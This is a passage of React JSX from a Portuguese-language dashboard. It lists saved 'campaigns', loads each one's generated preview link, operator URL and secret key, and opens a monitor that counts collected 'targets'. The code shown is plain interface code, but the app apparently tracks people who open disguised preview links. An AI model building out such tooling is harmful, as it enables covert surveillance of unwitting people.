                  <div style={{ color: 'var(--text-muted)', fontSize: '0.9rem' }}>Nenhuma campanha no histórico local. Crie uma para começar!</div>
                ) : (
                  campaignIndex.map(camp => (
                    <div 
                      key={camp.id}
                      style={{ 
                        background: 'rgba(5, 8, 17, 0.6)', 
                        border: '1px solid rgba(0, 218, 255, 0.3)', 
                        padding: '15px', 
                        borderRadius: '8px',
                        cursor: 'pointer',
                        transition: 'all 0.2s',
                        display: 'flex',
                        flexDirection: 'column',
                        gap: '8px'
                      }}
                      onMouseOver={e => { e.currentTarget.style.borderColor = 'var(--neon-blue)'; e.currentTarget.style.background = 'rgba(0, 218, 255, 0.05)'; }}
                      onMouseOut={e => { e.currentTarget.style.borderColor = 'rgba(0, 218, 255, 0.3)'; e.currentTarget.style.background = 'rgba(5, 8, 17, 0.6)'; }}
                      onClick={async () => {
                        addLog(`Carregando dados da campanha [${camp.id}]...`, 'system');
                        try {
                          const data = await apiGet(camp.id, camp.secretKey);
                          setActiveCampaignId(camp.id);
                          setActiveCampaignKey(camp.secretKey);
                          setGeneratedLink(`${window.location.origin}/preview?id=${camp.id}`);
                          setOperatorUrl(`${window.location.origin}/?operator=1&id=${camp.id}&key=${camp.secretKey}`);
                          setTitle(data.title || camp.title || '');
                          setDescription(data.description || '');
                          if (data.image) setImagePreview(data.image);
                          if (data.targets) setTargets(data.targets);
                          setActiveTab('monitor');
                          addLog(`Histórico carregado com sucesso. ${data.targets?.length || 0} alvos encontrados.`, 'success');
                        } catch (err) {
                          addLog(`Erro ao carregar histórico: ${err.message}`, 'error');
                          alert('Erro ao carregar dados. A campanha pode ter expirado ou a chave é inválida.');
                        }
                      }}
                    >
                      <div style={{ fontWeight: 'bold', color: 'var(--neon-blue)', fontSize: '1.05rem', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
                        {camp.title || 'Sem título'}
                      </div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.75rem', color: 'var(--text-muted)' }}>
                        <span style={{ fontFamily: 'var(--font-mono)' }}>ID: {camp.id.slice(-6).toUpperCase()}</span>
                        <span>{new Date(camp.createdAt).toLocaleDateString()}</span>
                      </div>
                      <div style={{ marginTop: '5px', fontSize: '0.75rem', color: 'var(--text-main)', borderTop: '1px dashed rgba(0, 218, 255, 0.2)', paddingTop: '8px', textAlign: 'center' }}>
                        Clique para carregar no Monitor
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          )}

        </div>

      </main>
      
      {/* Bottom stats status bar */}
      <footer style={{
        background: '#050811',
        borderTop: '1px solid rgba(0, 255, 102, 0.15)',
        padding: '5px 20px',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        fontFamily: 'var(--font-mono)',
        fontSize: '0.7rem',
        color: 'var(--text-muted)'
      }}>
        <div>STATUS: CONEXÃO SEGURA // SSL ATIVO</div>
        <div style={{ display: 'flex', gap: '20px' }}>
          <span>BANCO DE DADOS: {targets.length} REGISTROS</span>
          <span style={{ color: 'var(--neon-green)' }}>MONITOR: ATIVO</span>
        </div>
      </footer>
    </div>
  );
}
